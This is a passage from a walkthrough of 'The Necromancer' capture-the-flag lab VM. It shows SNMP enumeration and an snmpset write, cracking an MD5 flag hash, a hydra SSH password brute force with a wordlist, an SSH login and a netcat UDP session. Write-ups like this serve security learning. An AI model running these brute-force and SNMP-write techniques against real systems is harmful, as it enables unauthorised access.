                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D

      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E
```

so now using the key as the community we get something different

```
root@kali:~# snmpwalk -v2c -c death2all 192.168.93.137
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

```
root@kali:~/necro# snmpset -v 2c -c death2allrw 192.168.93.137 iso.3.6.1.2.1.1.6.0 s Unlocked
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
```

```
root@kali:~# snmpwalk -v2c -c death2all 192.168.93.137
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

using [https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx) cracked the flag to `demonslayer`


```
root@kali:~/necro# hydra -l demonslayer -P /usr/share/wordlists/rockyou.txt 192.168.93.137 ssh -t 4
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-07-17 23:45:32
[DATA] max 4 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~56032 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.93.137   login: demonslayer   password: 12345678
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-07-17 23:45:42
```

```
root@kali:~/necro# ssh demonslayer@192.168.93.137
The authenticity of host '192.168.93.137 (192.168.93.137)' can't be established.
ECDSA key fingerprint is SHA256:sIaywVX5Ba0Qbo/sFM3Gf9cY9SMJpHk2oTZmOHKTtLU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.93.137' (ECDSA) to the list of known hosts.
demonslayer@192.168.93.137's password:

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                               THE NECROMANCER!
                                 by  @xerubus

$
```


```
$ pwd
/home/demonslayer
$ ls
flag8.txt
$ cat flag8.txt
You enter the Necromancer's Lair!

A stench of decay fills this place.

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!"

Defend yourself!  Counter attack the Necromancer's spells at u777!

```

```
$ nc -u 127.0.0.1 777



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?


** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?


** You only have 1 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?


** You only have 0 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?

!!!!!!! You have been defeated by The Necromancer! (*_*) !!!!!!!

Connection to 192.168.93.137 closed by remote host.
Connection to 192.168.93.137 closed.
```
